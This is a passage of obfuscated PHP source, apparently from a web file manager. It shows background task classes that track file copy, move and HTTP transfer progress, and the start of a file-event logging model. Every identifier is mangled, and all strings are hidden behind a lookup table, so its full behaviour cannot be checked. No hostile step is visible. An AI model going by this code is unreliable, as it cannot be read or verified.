{ return; } $ñ¾ÙğÛ“ = self::get($¶÷¸éĞè[$‹•ŠåúÙ[491]]); $Ã­İ‘ô« = $ñ¾ÙğÛ“[$‹•ŠåúÙ[846]]; if ($Ã­İ‘ô« == self::STATYS_KILL) { $ßì®ùÆÄ = array($‹•ŠåúÙ[1838] => LNG($‹•ŠåúÙ[1839]), $‹•ŠåúÙ[1336] => !1); Cache::set($‹•ŠåúÙ[1840] . $this->task[$‹•ŠåúÙ[491]], $ßì®ùÆÄ, 30); $this->onKill(); $this->end(); die; } else { if ($Ã­İ‘ô« == self::STATYS_STOP) { $³Å‡Üè = 2; $ñ¾ÙğÛ“[$‹•ŠåúÙ[1827]] += $³Å‡Üè; self::valueSet($¶÷¸éĞè[$‹•ŠåúÙ[491]], $ñ¾ÙğÛ“); sleep($³Å‡Üè); $this->update(); return; } } $¶÷¸éĞè[$‹•ŠåúÙ[846]] = $Ã­İ‘ô« ? $Ã­İ‘ô« : $¶÷¸éĞè[$‹•ŠåúÙ[846]]; $¶÷¸éĞè[$‹•ŠåúÙ[1827]] = $ñ¾ÙğÛ“[$‹•ŠåúÙ[1827]] ? $ñ¾ÙğÛ“[$‹•ŠåúÙ[1827]] : 0; $¶÷¸éĞè[$‹•ŠåúÙ[1826]] = timeFloat(); Hook::trigger($‹•ŠåúÙ[1841], $¶÷¸éĞè); self::valueSet($¶÷¸éĞè[$‹•ŠåúÙ[491]], $¶÷¸éĞè); } public function onKillSet($Ç¸ÕŒ, $óü°×¬í = array()) { $this->onKillCall = array($Ç¸ÕŒ, $óü°×¬í); } public function onKill() { $¾ÎÔùÊ¢ =& $_SERVER[‰‰Ş‚€]; self::log($¾ÎÔùÊ¢[1834] . $this->task[$¾ÎÔùÊ¢[491]] . $¾ÎÔùÊ¢[1842]); Hook::trigger($¾ÎÔùÊ¢[1843], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Õœ¥‘¡‡) { $ğÎÌ¤Øé =& $_SERVER[‰‰Ş‚€]; Cache::set($ğÎÌ¤Øé[1840] . $this->task[$ğÎÌ¤Øé[491]], $Õœ¥‘¡‡, 60); if (!is_array($Õœ¥‘¡‡) || !$Õœ¥‘¡‡[$ğÎÌ¤Øé[1336]]) { self::log($ğÎÌ¤Øé[1844] . json_encode($Õœ¥‘¡‡)); } return $Õœ¥‘¡‡; } public static function get($œÂ»â²˜) { $ÔéÎı±¾ =& $_SERVER[‰‰Ş‚€]; $‘İÆ±Š = self::valueGet($œÂ»â²˜); if (is_array($‘İÆ±Š) && $‘İÆ±Š[$ÔéÎı±¾[1845]]) { $ŸÉÒŞ¼“ = ActionApply($‘İÆ±Š[$ÔéÎı±¾[1845]], array($‘İÆ±Š)); $‘İÆ±Š = is_array($ŸÉÒŞ¼“) ? $ŸÉÒŞ¼“ : $‘İÆ±Š; } return $‘İÆ±Š; } public static function listData() { $ä¯ÏÎ“£ = self::valueGet(); return array_sort_by($ä¯ÏÎ“£, $_SERVER[‰‰Ş‚€][1824], !0); } public static function kill($ÆÂªÖ´İ) { return self::changeStatus($ÆÂªÖ´İ, self::STATYS_KILL); } public static function stop($íûÊôĞú) { return self::changeStatus($íûÊôĞú, self::STATYS_STOP); } public static function restart($äûé…ó¹) { return self::changeStatus($äûé…ó¹, self::STATYS_RUNNING); } public static function killAll() { $¨Ÿ‚Úşß =& $_SERVER[‰‰Ş‚€]; $ÉñÎó¶Ÿ = self::listData(); foreach ($ÉñÎó¶Ÿ as $²¤ä–´“) { self::kill($²¤ä–´“[$¨Ÿ‚Úşß[491]]); } sleep(2); foreach ($ÉñÎó¶Ÿ as $²¤ä–´“) { self::valueSet($²¤ä–´“[$¨Ÿ‚Úşß[491]], !1); } } private static function changeStatus($Š›»´Ü›, $² úç) { $Åêü†‹Í =& $_SERVER[‰‰Ş‚€]; $„—£²‘ = self::valueGet($Š›»´Ü›); if (!$„—£²‘) { return !1; } $„—£²‘[$Åêü†‹Í[846]] = $² úç; self::valueSet($Š›»´Ü›, $„—£²‘); self::log($Åêü†‹Í[1846] . $„—£²‘[$Åêü†‹Í[491]] . $Åêü†‹Í[1847] . $² úç); return !0; } public static function valueGet($¢†·ÈîÊ = false) { $ïŠ¬Ä§û =& $_SERVER[‰‰Ş‚€]; if ($¢†·ÈîÊ) { $ÂòØ²Ã = Model($ïŠ¬Ä§û[538])->where(array($ïŠ¬Ä§û[105] => $¢†·ÈîÊ, $ïŠ¬Ä§û[43] => $ïŠ¬Ä§û[1181]))->find(); return $ÂòØ²Ã ? json_decode($ÂòØ²Ã[$ïŠ¬Ä§û[459]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ƒàÁóÂ = false) { $¯ÃªÕ‘ =& $_SERVER[‰‰Ş‚€]; $Úø“ÎÁ = array($¯ÃªÕ‘[43] => $¯ÃªÕ‘[1181]); if ($ƒàÁóÂ) { $Úø“ÎÁ[$¯ÃªÕ‘[1820]] = $ƒàÁóÂ; } $ù¹¹Ÿç½ = Model($¯ÃªÕ‘[538])->where($Úø“ÎÁ)->select(); $ù¹¹Ÿç½ = $ù¹¹Ÿç½ ? $ù¹¹Ÿç½ : array(); foreach ($ù¹¹Ÿç½ as $¨¹†¦Å­ => $Ğ·Üñéß) { $ù¹¹Ÿç½[$¨¹†¦Å­] = json_decode($Ğ·Üñéß[$¯ÃªÕ‘[459]], !0); } return $ù¹¹Ÿç½; } public static function valueSet($øŞ«Æö, $½µÛÖ¤) { $›…Ç¤¢¾ =& $_SERVER[‰‰Ş‚€]; if (!$½µÛÖ¤) { return Model($›…Ç¤¢¾[538])->where(array($›…Ç¤¢¾[105] => $øŞ«Æö, $›…Ç¤¢¾[43] => $›…Ç¤¢¾[1181]))->delete(); } $ÒœşØ = json_encode($½µÛÖ¤); if (!$ÒœşØ) { ob_start(); var_dump($½µÛÖ¤); $÷–Ñİ« = ob_get_clean(); self::log($›…Ç¤¢¾[1848] . json_encode_force($÷–Ñİ«)); } if (!$øŞ«Æö || !$½µÛÖ¤[$›…Ç¤¢¾[491]]) { return !1; } $êèå®†« = array($›…Ç¤¢¾[43] => $›…Ç¤¢¾[1181], $›…Ç¤¢¾[1820] => USER_ID, $›…Ç¤¢¾[105] => $øŞ«Æö, $›…Ç¤¢¾[459] => $ÒœşØ); $’½™¼ = $›…Ç¤¢¾[1849]; CacheLock::lock($’½™¼); Model($›…Ç¤¢¾[538])->add($êèå®†«, array(), !0); CacheLock::unlock($’½™¼); } public static function log($´Ş¯‚˜˜) { if (!GLOBAL_DEBUG) { return; } write_log($´Ş¯‚˜˜, $_SERVER[‰‰Ş‚€][1850]); } } class TaskFileTransfer extends Task { protected function startAfter() { $˜­ˆ¬Ú¯ =& $_SERVER[‰‰Ş‚€]; $Ùµ¬¡ßŞ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($˜­ˆ¬Ú¯[1851], array($this, $˜­ˆ¬Ú¯[1852])); Hook::bind($˜­ˆ¬Ú¯[1347], array($this, $˜­ˆ¬Ú¯[1853])); Hook::bind($˜­ˆ¬Ú¯[1854], array($this, $˜­ˆ¬Ú¯[1855])); Hook::bind($˜­ˆ¬Ú¯[691], array($this, $˜­ˆ¬Ú¯[1856])); Hook::bind($˜­ˆ¬Ú¯[692], array($this, $˜­ˆ¬Ú¯[1857])); Hook::bind($˜­ˆ¬Ú¯[698], array($this, $˜­ˆ¬Ú¯[1858])); Hook::bind($˜­ˆ¬Ú¯[699], array($this, $˜­ˆ¬Ú¯[1859])); Hook::bind($˜­ˆ¬Ú¯[694], array($this, $˜­ˆ¬Ú¯[1860])); Hook::bind($˜­ˆ¬Ú¯[696], array($this, $˜­ˆ¬Ú¯[1861])); Hook::bind($˜­ˆ¬Ú¯[660], array($this, $˜­ˆ¬Ú¯[1862])); Hook::bind($˜­ˆ¬Ú¯[657], array($this, $˜­ˆ¬Ú¯[1862])); Hook::bind($˜­ˆ¬Ú¯[662], array($this, $˜­ˆ¬Ú¯[1862])); Hook::bind($˜­ˆ¬Ú¯[664], array($this, $˜­ˆ¬Ú¯[1862])); Hook::bind($˜­ˆ¬Ú¯[666], array($this, $˜­ˆ¬Ú¯[1862])); Hook::bind($˜­ˆ¬Ú¯[1863], array($this, $˜­ˆ¬Ú¯[1864])); Hook::bind($˜­ˆ¬Ú¯[682], array($this, $˜­ˆ¬Ú¯[1865])); $this->sourceModelCopyFlag = !1; Hook::bind($˜­ˆ¬Ú¯[1866], array($this, $˜­ˆ¬Ú¯[1867])); Hook::bind($˜­ˆ¬Ú¯[1868], array($this, $˜­ˆ¬Ú¯[1869])); Hook::bind($˜­ˆ¬Ú¯[1870], array($this, $˜­ˆ¬Ú¯[1871])); $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1872]] = LNG($˜­ˆ¬Ú¯[1873]); $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1874]] = 0; $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1875]] = 0; $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1174]] = $˜­ˆ¬Ú¯[22]; $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1876]] = $˜­ˆ¬Ú¯[22]; $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1877]] = 0; $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1878]] = 0; $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1879]] = 0; if (!$Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1707]]) { $Ùµ¬¡ßŞ[$˜­ˆ¬Ú¯[1707]] = LNG($˜­ˆ¬Ú¯[1880]); } } protected function endAfter() { $ÔªÖ«»‘ =& $_SERVER[‰‰Ş‚€]; Hook::unbind($ÔªÖ«»‘[1851], array($this, $ÔªÖ«»‘[1852])); Hook::unbind($ÔªÖ«»‘[1347], array($this, $ÔªÖ«»‘[1853])); Hook::unbind($ÔªÖ«»‘[1854], array($this, $ÔªÖ«»‘[1855])); Hook::unbind($ÔªÖ«»‘[691], array($this, $ÔªÖ«»‘[1856])); Hook::unbind($ÔªÖ«»‘[692], array($this, $ÔªÖ«»‘[1857])); Hook::unbind($ÔªÖ«»‘[698], array($this, $ÔªÖ«»‘[1858])); Hook::unbind($ÔªÖ«»‘[699], array($this, $ÔªÖ«»‘[1859])); Hook::unbind($ÔªÖ«»‘[694], array($this, $ÔªÖ«»‘[1860])); Hook::unbind($ÔªÖ«»‘[696], array($this, $ÔªÖ«»‘[1861])); Hook::unbind($ÔªÖ«»‘[660], array($this, $ÔªÖ«»‘[1862])); Hook::unbind($ÔªÖ«»‘[657], array($this, $ÔªÖ«»‘[1862])); Hook::unbind($ÔªÖ«»‘[662], array($this, $ÔªÖ«»‘[1862])); Hook::unbind($ÔªÖ«»‘[664], array($this, $ÔªÖ«»‘[1862])); Hook::unbind($ÔªÖ«»‘[666], array($this, $ÔªÖ«»‘[1862])); Hook::unbind($ÔªÖ«»‘[1863], array($this, $ÔªÖ«»‘[1864])); Hook::unbind($ÔªÖ«»‘[682], array($this, $ÔªÖ«»‘[1865])); Hook::unbind($ÔªÖ«»‘[1866], array($this, $ÔªÖ«»‘[1867])); Hook::unbind($ÔªÖ«»‘[1868], array($this, $ÔªÖ«»‘[1869])); Hook::unbind($ÔªÖ«»‘[1870], array($this, $ÔªÖ«»‘[1871])); } public function copyMoveStart($ÎÑ‹ğ¯è, $º¦é¦›Ÿ, $•ş£ÜÙ, $ÕÕøïÊÍ) { $Ê§Ó”úê =& $_SERVER[‰‰Ş‚€]; self::log($Ê§Ó”úê[1881] . $º¦é¦›Ÿ . $Ê§Ó”úê[83] . $ÕÕøïÊÍ); $€Â±¢—ì = rtrim(TEMP_FILES, $Ê§Ó”úê[18]); if (substr($º¦é¦›Ÿ, 0, strlen($€Â±¢—ì)) == $€Â±¢—ì) { return; } if (substr($ÕÕøïÊÍ, 0, strlen($€Â±¢—ì)) == $€Â±¢—ì) { return; } $š°ùÂŸ£ =& $this->task; $š°ùÂŸ£[$Ê§Ó”úê[1882]] = KodIO::transferType($ÎÑ‹ğ¯è, $•ş£ÜÙ); $this->update(); } public function updateAfter() { $µøÀû› =& $_SERVER[‰‰Ş‚€]; $Á½â¨­ì =& $this->task; if (!$Á½â¨­ì[$µøÀû›[860]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Á½â¨­ì[$µøÀû›[1882]] == $µøÀû›[1448]) { return; } self::updateTask($Á½â¨­ì); } private static function updateTask(&$ÎÄïÍ¾) { $‘ç™ÄÎá =& $_SERVER[‰‰Ş‚€]; if ($ÎÄïÍ¾[$‘ç™ÄÎá[1882]] == $‘ç™ÄÎá[1318] || $ÎÄïÍ¾[$‘ç™ÄÎá[1882]] == $‘ç™ÄÎá[118]) { if ($ÎÄïÍ¾[$‘ç™ÄÎá[1876]]) { $ÎÄïÍ¾[$‘ç™ÄÎá[1879]] = $ÎÄïÍ¾[$‘ç™ÄÎá[1878]] + $ÎÄïÍ¾[$‘ç™ÄÎá[1875]]; } } else { if ($ÎÄïÍ¾[$‘ç™ÄÎá[1882]] == $‘ç™ÄÎá[1449]) { if ($ÎÄïÍ¾[$‘ç™ÄÎá[1876]] == $‘ç™ÄÎá[1318]) { $ÎÄïÍ¾[$‘ç™ÄÎá[1879]] = $ÎÄïÍ¾[$‘ç™ÄÎá[1878]] + $ÎÄïÍ¾[$‘ç™ÄÎá[1875]] * 0.5; } else { if ($ÎÄïÍ¾[$‘ç™ÄÎá[1876]] == $‘ç™ÄÎá[118]) { $ÎÄïÍ¾[$‘ç™ÄÎá[1879]] = $ÎÄïÍ¾[$‘ç™ÄÎá[1878]] + $ÎÄïÍ¾[$‘ç™ÄÎá[1874]] * 0.5 + $ÎÄïÍ¾[$‘ç™ÄÎá[1875]] * 0.5; } } } } $ÎÄïÍ¾[$‘ç™ÄÎá[1822]] = $ÎÄïÍ¾[$‘ç™ÄÎá[1879]] / $ÎÄïÍ¾[$‘ç™ÄÎá[860]]; if ($ÎÄïÍ¾[$‘ç™ÄÎá[1822]] > 0) { $µ…üÙÃ¼ = timeFloat() - $ÎÄïÍ¾[$‘ç™ÄÎá[1824]] - $ÎÄïÍ¾[$‘ç™ÄÎá[1827]]; $ÎÄïÍ¾[$‘ç™ÄÎá[1828]] = $µ…üÙÃ¼ * (1 - $ÎÄïÍ¾[$‘ç™ÄÎá[1822]]) / $ÎÄïÍ¾[$‘ç™ÄÎá[1822]]; } } public function addPath($¶“ã×İÚ) { $–ãÛßØ =& $_SERVER[‰‰Ş‚€]; if (!$¶“ã×İÚ) { return; } $§è§À› =& $this->task; $ß²öªÎ’ = IO::infoWithChildren($¶“ã×İÚ); $“º†’¾ˆ = $§è§À›[$–ãÛßØ[1883]] ? $§è§À›[$–ãÛßØ[1883]][$–ãÛßØ[1884]] : 0; $§è§À›[$–ãÛßØ[1883]] = array($–ãÛßØ[1884] => $“º†’¾ˆ + 1, $–ãÛßØ[513] => $ß²öªÎ’[$–ãÛßØ[42]], $–ãÛßØ[97] => $ß²öªÎ’[$–ãÛßØ[97]], $–ãÛßØ[602] => $ß²öªÎ’[$–ãÛßØ[602]] ? $ß²öªÎ’[$–ãÛßØ[602]] : $ß²öªÎ’[$–ãÛßØ[97]]); if ($ß²öªÎ’[$–ãÛßØ[43]] == $–ãÛßØ[241]) { $§è§À›[$–ãÛßØ[1172]] += 1; } else { $§è§À›[$–ãÛßØ[1172]] += $ß²öªÎ’[$–ãÛßØ[92]][$–ãÛßØ[90]]; if ($ß²öªÎ’[$–ãÛßØ[202]]) { $§è§À›[$–ãÛßØ[1172]] += $ß²öªÎ’[$–ãÛßØ[92]][$–ãÛßØ[91]] + 1; } } $§è§À›[$–ãÛßØ[860]] += $ß²öªÎ’[$–ãÛßØ[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¶×‹§Í€) { } public function sourceAddHashEnd($¨Ÿé¦ğ) { } public function sourceAddFileStart($ùÎŞÊÕ) { $æäÕÓ¨¦ =& $_SERVER[‰‰Ş‚€]; $ØıÎÚğ¥ =& $this->task; $ØıÎÚğ¥[$æäÕÓ¨¦[1874]] = $ùÎŞÊÕ[$æäÕÓ¨¦[89]]; $ØıÎÚğ¥[$æäÕÓ¨¦[1872]] = $ùÎŞÊÕ[$æäÕÓ¨¦[42]]; $ØıÎÚğ¥[$æäÕÓ¨¦[1174]] = $ùÎŞÊÕ[$æäÕÓ¨¦[42]]; $ØıÎÚğ¥[$æäÕÓ¨¦[1885]] = $ùÎŞÊÕ[$æäÕÓ¨¦[97]]; $this->update(); } public function sourceAddFileEnd($£íÓ×…Ş) { $ »í¨í× =& $_SERVER[‰‰Ş‚€]; $…Ã®½· =& $this->task; $…Ã®½·[$ »í¨í×[1879]] += $£íÓ×…Ş[$ »í¨í×[89]]; $…Ã®½·[$ »í¨í×[1885]] = $£íÓ×…Ş[$ »í¨í×[97]]; $this->update(1); } public function copyFileStart($Ã“„ŠÏ, $åŠ“Ô†, $÷¢ö‹€Ñ, $°·¦¸¹‡, $¡”´Õ–À, $ò‡Šô¨Ê) { $¸ë©Áà =& $_SERVER[‰‰Ş‚€]; $ÍÈîªÙ = $¡”´Õ–À; if ($ÍÈîªÙ == $GLOBALS[$¸ë©Áà[1886]]) { $ÍÈîªÙ = $GLOBALS[$¸ë©Áà[1887]]; } $GLOBALS[$¸ë©Áà[1887]] = $¡”´Õ–À; $GLOBALS[$¸ë©Áà[1886]] = $ò‡Šô¨Ê; $êÜëèú =& $this->task; $êÜëèú[$¸ë©Áà[1872]] = $ÍÈîªÙ; $êÜëèú[$¸ë©Áà[1874]] = (int) $Ã“„ŠÏ->size($åŠ“Ô†); $êÜëèú[$¸ë©Áà[1875]] = 0; $êÜëèú[$¸ë©Áà[1174]] = $¸ë©Áà[22]; $êÜëèú[$¸ë©Áà[1876]] = $¸ë©Áà[22]; $êÜëèú[$¸ë©Áà[1877]] = 0; $ŒË°¸Ò¬ = $êÜëèú[$¸ë©Áà[1874]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($êÜëèú[$¸ë©Áà[491]] . $¸ë©Áà[1888]); if ($ŒË°¸Ò¬ && file_exists(get_path_father($°·¦¸¹‡))) { Cache::set($êÜëèú[$¸ë©Áà[491]] . $¸ë©Áà[1888], $°·¦¸¹‡); $êÜëèú[$¸ë©Áà[1845]] = array($¸ë©Áà[1889], $¸ë©Áà[1890]); } $this->update(0, $ŒË°¸Ò¬); } public static function updateCopyLocalFileSize($ŸâÈı½) { $¿¿± î =& $_SERVER[‰‰Ş‚€]; $‹†µÍĞ” = Cache::get($ŸâÈı½[$¿¿± î[491]] . $¿¿± î[1888]); if (!$‹†µÍĞ” || !file_exists($‹†µÍĞ”)) { return $ŸâÈı½; } $ŸâÈı½[$¿¿± î[1875]] = @filesize($‹†µÍĞ”); $ŸâÈı½[$¿¿± î[1879]] += $ŸâÈı½[$¿¿± î[1875]]; self::updateTask($ŸâÈı½); return $ŸâÈı½; } public function copyFileEnd($È“Œ¿œ, $Š¥´‡¾í, $ÖœÎ¸ç“, $•şò¹Ö», $š÷µ¦µ™, $Äßæ‘Æ“) { $°Ş¤ÑÔ =& $_SERVER[‰‰Ş‚€]; $ØşÂÛëã =& $this->task; $ØşÂÛëã[$°Ş¤ÑÔ[1875]] = $ØşÂÛëã[$°Ş¤ÑÔ[1874]]; $ØşÂÛëã[$°Ş¤ÑÔ[1876]] = $°Ş¤ÑÔ[22]; unset($ØşÂÛëã[$°Ş¤ÑÔ[1845]]); if ($š÷µ¦µ™ == $ØşÂÛëã[$°Ş¤ÑÔ[1872]]) { $ØşÂÛëã[$°Ş¤ÑÔ[1878]] += $ØşÂÛëã[$°Ş¤ÑÔ[1874]]; $ØşÂÛëã[$°Ş¤ÑÔ[1879]] = $ØşÂÛëã[$°Ş¤ÑÔ[1878]]; $¨ÍÀÛ×Ë = 1; if (isset($ØşÂÛëã[$°Ş¤ÑÔ[1885]]) && $ØşÂÛëã[$°Ş¤ÑÔ[1885]] == $Š¥´‡¾í) { $¨ÍÀÛ×Ë = 0; } $this->update($¨ÍÀÛ×Ë); } else { $this->update(); $ØşÂÛëã[$°Ş¤ÑÔ[1875]] = 0; } Cache::remove($ØşÂÛëã[$°Ş¤ÑÔ[491]] . $°Ş¤ÑÔ[1888]); self::log($°Ş¤ÑÔ[1891] . $Š¥´‡¾í . $°Ş¤ÑÔ[83] . $•şò¹Ö» . $°Ş¤ÑÔ[10] . $š÷µ¦µ™ . $°Ş¤ÑÔ[1892] . $ØşÂÛëã[$°Ş¤ÑÔ[1872]]); } public function updateFileEnd($ıÓ”É, $ÍïÖ¸) { $©Ä“€ŠŒ =& $_SERVER[‰‰Ş‚€]; $Ö« Ş¿ =& $this->task; $Ö« Ş¿[$©Ä“€ŠŒ[1872]] = $ıÓ”É; $Ö« Ş¿[$©Ä“€ŠŒ[1874]] = $ÍïÖ¸; $Ö« Ş¿[$©Ä“€ŠŒ[1878]] += $ÍïÖ¸; $Ö« Ş¿[$©Ä“€ŠŒ[1879]] = $Ö« Ş¿[$©Ä“€ŠŒ[1878]]; $this->update(1); self::log($©Ä“€ŠŒ[1893] . $ıÓ”É); } public function sourceModelCopy($Áêã”—) { $ÎºâÜğ¹ =& $_SERVER[‰‰Ş‚€]; $“¨ã˜Ã = $Áêã”—[0]; $÷êÅïí‰ = $Áêã”—[1]; $Ã“ñ×ÀÙ =& $this->task; $this->sourceModelCopyFlag = !0; $±Ïàë¿Ï = 0; switch ($“¨ã˜Ã) { case $ÎºâÜğ¹[658]: $±Ïàë¿Ï = 1; break; case $ÎºâÜğ¹[661]: $Ã“ñ×ÀÙ[$ÎºâÜğ¹[1872]] = $÷êÅïí‰[$ÎºâÜğ¹[42]]; break; case $ÎºâÜğ¹[663]: $±Ïàë¿Ï = intval($Áêã”—[$ÎºâÜğ¹[475]] * 0.4); break; case $ÎºâÜğ¹[665]: $±Ïàë¿Ï = intval($Áêã”—[$ÎºâÜğ¹[475]] * 0.2); break; case $ÎºâÜğ¹[667]: $±Ïàë¿Ï = intval($Áêã”—[$ÎºâÜğ¹[475]] * 0.4); break; } $this->update($±Ïàë¿Ï); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¾ÔÄ—È, $ƒÓÖ©§ø) { $Ÿ½˜š‰ =& $_SERVER[‰‰Ş‚€]; $this->sourceModelCopyFlag = !0; $÷–ÜÏ‡× = 1; if (isset($¾ÔÄ—È[$Ÿ½˜š‰[92]])) { $÷–ÜÏ‡× = $¾ÔÄ—È[$Ÿ½˜š‰[92]][$Ÿ½˜š‰[90]]; $÷–ÜÏ‡× = $÷–ÜÏ‡× + $¾ÔÄ—È[$Ÿ½˜š‰[92]][$Ÿ½˜š‰[91]] + 1; } $this->update($÷–ÜÏ‡×); $this->sourceModelCopyFlag = !1; } public function sourceMove($§ÈÒº Ö) { $this->sourceRemove($§ÈÒº Ö, !1); } public function curlProgress($‘ğ¸ßö›, $Ûî¥õşÄ, $™¶ Äê, $§÷ÜÂ–Ê, $à˜àÏ…«) { $ˆ‡›œÌ™ =& $_SERVER[‰‰Ş‚€]; $˜¾êĞÉ =& $this->task; if ($à˜àÏ…« > 0) { $˜¾êĞÉ[$ˆ‡›œÌ™[1174]] = $ˆ‡›œÌ™[1894]; $˜¾êĞÉ[$ˆ‡›œÌ™[1876]] = $ˆ‡›œÌ™[118]; if ($˜¾êĞÉ[$ˆ‡›œÌ™[1874]]) { $˜¾êĞÉ[$ˆ‡›œÌ™[1875]] = $à˜àÏ…«; } if ($˜¾êĞÉ[$ˆ‡›œÌ™[1877]]) { $˜¾êĞÉ[$ˆ‡›œÌ™[1875]] = $à˜àÏ…« + $˜¾êĞÉ[$ˆ‡›œÌ™[1877]]; } } else { if ($™¶ Äê > 0) { if ($˜¾êĞÉ[$ˆ‡›œÌ™[1874]] == $Ûî¥õşÄ) { $˜¾êĞÉ[$ˆ‡›œÌ™[1875]] = $™¶ Äê; $˜¾êĞÉ[$ˆ‡›œÌ™[1174]] = $ˆ‡›œÌ™[1895]; $˜¾êĞÉ[$ˆ‡›œÌ™[1876]] = $ˆ‡›œÌ™[1318]; } } } $this->update(); } public function curlProgressStart($ª”éù‡›) { } public function curlProgressEnd($Äöé³Ù) { $§¨‹ŠÚ± =& $_SERVER[‰‰Ş‚€]; $õá‹Œ”ˆ =& $this->task; $×åœŸ = curl_getinfo($Äöé³Ù); $ä—¬˜øĞ = $×åœŸ[$§¨‹ŠÚ±[1896]]; if ($ä—¬˜øĞ == -1) { $ä—¬˜øĞ = $×åœŸ[$§¨‹ŠÚ±[1897]]; } if ($õá‹Œ”ˆ[$§¨‹ŠÚ±[1876]] == $§¨‹ŠÚ±[118] && $ä—¬˜øĞ) { $õá‹Œ”ˆ[$§¨‹ŠÚ±[1877]] += $ä—¬˜øĞ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $”ªİó«á =& $_SERVER[‰‰Ş‚€]; $ØŠ‰©± =& $this->task; $ØŠ‰©±[$”ªİó«á[1898]] = 1; Hook::bind($”ªİó«á[1866], array($this, $”ªİó«á[1899])); Hook::bind($”ªİó«á[1868], array($this, $”ªİó«á[1900])); Hook::bind($”ªİó«á[1870], array($this, $”ªİó«á[1901])); } protected function endAfter() { $û…›æ’Ù =& $_SERVER[‰‰Ş‚€]; Hook::unbind($û…›æ’Ù[1866], array($this, $û…›æ’Ù[1899])); Hook::unbind($û…›æ’Ù[1868], array($this, $û…›æ’Ù[1900])); Hook::unbind($û…›æ’Ù[1870], array($this, $û…›æ’Ù[1901])); } public function progressStart($¥Ğó—Ó) { $¹ì±Ò‚ƒ =& $_SERVER[‰‰Ş‚€]; $şÈ¬ª„‰ = curl_getinfo($¥Ğó—Ó); self::log($¹ì±Ò‚ƒ[1902] . $şÈ¬ª„‰[$¹ì±Ò‚ƒ[391]]); self::valueSet($this->task[$¹ì±Ò‚ƒ[491]], $this->task); } public function progressEnd($è’ö‰) { $¦ÔÍ¹‘¥ =& $_SERVER[‰‰Ş‚€]; self::log($¦ÔÍ¹‘¥[1903] . $this->task[$¦ÔÍ¹‘¥[491]]); $this->end(); } public function progress($­¹Õ˜Š‘, $ä°¥»Ë†, $‘éñšÚÑ, $’ó€òÒ, $İ’Á—úã) { $–åö”Œ³ =& $_SERVER[‰‰Ş‚€]; $‚¥…Û’ =& $this->task; if ($İ’Á—úã > 0) { $‚¥…Û’[$–åö”Œ³[1172]] = $‚¥…Û’[$–åö”Œ³[1172]] == 0 ? $’ó€òÒ : $‚¥…Û’[$–åö”Œ³[1172]]; $‚¥…Û’[$–åö”Œ³[1821]] = $İ’Á—úã; } else { if ($‘éñšÚÑ > 0) { $‚¥…Û’[$–åö”Œ³[1172]] = $‚¥…Û’[$–åö”Œ³[1172]] == 0 ? $ä°¥»Ë† : $‚¥…Û’[$–åö”Œ³[1172]]; $‚¥…Û’[$–åö”Œ³[1821]] = $‘éñšÚÑ; } } $this->update(); self::log("\160\x72\157\147\162\145\x73\x73\x48\x74\164\x70\72\144\x6f\167\156\72{$‘éñšÚÑ}\57{$ä°¥»Ë†}\73\x20\x75\160\x6c\x6f\141\144\72{$İ’Á—úã}\57{$’ó€òÒ}\x3b"); } } goto c“é³¨×¦Ö; BÕ‹¸¬º±: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\x63\x65\x5f\x65\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\164\151\155\145", "\151\156\x73\145\x72\164", "\x66\165\156\x63\164\151\157\156"), array("\x64\x65\163\143", '', "\x69\x6e\163\145\162\x74\x2c\165\160\144\141\x74\145\x2c\163\x65\154\145\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($‡ŸÙ¡‚å, $í‘Ûİ²¿, $‰Èƒ = '') { $ñÔÈÎêÛ =& $_SERVER[‰‰Ş‚€]; if (!$this->eventSave) { return; } $³Šé‰Å = Model($ñÔÈÎêÛ[1467])->sourceInfo($‡ŸÙ¡‚å); if (!$³Šé‰Å) { return !1; } if ($this->isDisableEvent($³Šé‰Å, $í‘Ûİ²¿)) { return; } if ($‰Èƒ && is_string($‰Èƒ)) { $‰Èƒ = array($ñÔÈÎêÛ[2060] => $‰Èƒ); } $çœ¼ÃÊÆ = KodUser::id(); $Üô‚¸ô÷ = array($ñÔÈÎêÛ[510] => $‡ŸÙ¡‚å, $ñÔÈÎêÛ[2259] => $³Šé‰Å[$ñÔÈÎêÛ[201]], $ñÔÈÎêÛ[2260] => $³Šé‰Å[$ñÔÈÎêÛ[42]], $ñÔÈÎêÛ[602] => !empty($³Šé‰Å[$ñÔÈÎêÛ[602]]) ? $³Šé‰Å[$ñÔÈÎêÛ[602]] : $ñÔÈÎêÛ[22], $ñÔÈÎêÛ[1811] => $çœ¼ÃÊÆ, $ñÔÈÎêÛ[515] => $í‘Ûİ²¿, $ñÔÈÎêÛ[1813] => $‰Èƒ); $this->addSystemLog($í‘Ûİ²¿, $Üô‚¸ô÷); unset($Üô‚¸ô÷[$ñÔÈÎêÛ[2260]], $Üô‚¸ô÷[$ñÔÈÎêÛ[602]]); return $this->add($Üô‚¸ô÷); } private function addSystemLog($Îñœç¾Ğ, $‚¸¼Õì) { $Ä’„ãÜ¦ =& $_SERVER[‰‰Ş‚€]; if ($Îñœç¾Ğ == 